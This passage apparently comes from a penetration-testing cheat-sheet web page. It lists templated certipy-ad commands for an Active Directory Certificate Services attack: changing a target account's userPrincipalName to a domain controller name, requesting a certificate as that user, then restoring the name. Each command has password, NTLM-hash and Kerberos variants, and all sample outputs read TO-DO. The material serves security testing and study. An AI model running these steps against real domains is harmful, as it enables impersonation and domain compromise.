TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target '<span class="o editable-keyword">&lt;DC&gt;</span>' -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' read
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-modify-target-users-userprincipalname">2. Modify Target Users userPrincipalName</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>$@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>$@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>$@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>$@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;DC_HOSTNAME&gt;</span>$@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-request-a-cert-of-target-user">2. Request a Cert of Target User</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -template 'User'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-change-back-target-users-userprincipalname">3. Change Back Target Users userPrincipalName</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;TARGET_USER_UPN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;TARGET_USER_UPN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;TARGET_USER_UPN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad account update -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes <span class="o editable-keyword">&lt;HASH&gt;</span> -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span> -user <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -upn '<span class="o editable-keyword">&lt;TARGET_USER_UPN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
